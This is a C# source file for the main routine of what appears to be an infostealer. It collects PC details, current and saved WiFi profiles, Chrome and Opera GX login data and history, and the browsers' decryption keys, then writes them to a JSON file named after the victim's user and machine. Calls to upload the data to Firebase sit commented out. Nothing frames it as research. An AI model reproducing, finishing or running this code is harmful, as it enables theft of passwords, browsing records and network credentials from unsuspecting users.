using System.Collections.Generic;
using System.Configuration;
using System.Data.Entity.Infrastructure;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Security.Policy;
//
using FireSharp.Config;
using FireSharp.Interfaces;
using FireSharp.Response;
using NativeWifi;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using static System.Runtime.InteropServices.JavaScript.JSType;
using static NativeWifi.WlanClient;
using static Org.BouncyCastle.Math.EC.ECCurve;
//

namespace UserData
{
	class Program
	{
		static async Task Main(string[] args)
		{
			// ukrainian for console
			Console.OutputEncoding = System.Text.Encoding.UTF8;

			// hide cursor
			Console.CursorVisible = false;

			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();

			// Get exe file path
			string exeFilePath = AppDomain.CurrentDomain.BaseDirectory;// + "users";

			// create file name
			string relativePath = $"{Environment.UserName}_{Environment.MachineName}.txt";

			// combine the path to the executable file with the relative path for the drive
			string DrivePath = Path.Combine(exeFilePath, relativePath);

			PC_Information pc = await PC.SendPCInfo();

			WiFi_Information CurrentWiFiProfile = await WiFi.GetWiFiInfo();
			List<WiFi_Profile> OtherWiFiProfiles = await WiFi.GetOtherWiFiProfilesInfo();
		
			List<Chrome_Logs> chrome_logs = await Chrome_Information.GetChromeLogs();
			List<Chrome_History> chrome_history = await Chrome_Information.GetChromeHistory();
	
			List<OperaGX_Logs> operaGX_Logs = await OperaGX_Information.GetOperaGXLogs();
			List<OperaGX_History> operaGX_History = await OperaGX_Information.GetOperaGXHistory();

			WiFi_Data WiFiData = new WiFi_Data
			{
				CurrentWiFiProfile = CurrentWiFiProfile,
				OtherWifiProfiles = OtherWiFiProfiles
			};

			Chrome_Data chrome_Data = new Chrome_Data
			{
				EncryptionKey = Chrome_Information.GetHex(Chrome_Information.GetEncryptionKey()),
				Chrome_Logs = chrome_logs,
				Chrome_History = chrome_history
			};

			OperaGX_Data operaGX_Data = new OperaGX_Data
			{
				EncryptionKey = OperaGX_Information.GetHex(OperaGX_Information.GetEncryptionKey()),
				OperaGX_Logs = operaGX_Logs,
				OperaGX_History = operaGX_History
			};

			JsonCategories allCategories = new JsonCategories
			{
				PC_Information = pc,
				WiFi_Data = WiFiData,
				Chrome_Data = chrome_Data,
				OperaGX_Data =  operaGX_Data
			};

			JsonSerializerSettings settings = new JsonSerializerSettings
			{
				Formatting =  Newtonsoft.Json.Formatting.Indented
			};
			string json = JsonConvert.SerializeObject(allCategories, settings);

			File.WriteAllText(DrivePath, json);

			//Firebase.FirebaseConfiguration();
			//Firebase.FirebaseSendData(json);
			//Console.WriteLine(Firebase.FirebaseGetAllData());

			stopwatch.Stop();
			Console.Write($"[Lead time: {stopwatch.Elapsed}]");
			Console.ReadLine();
		}
	} 
}

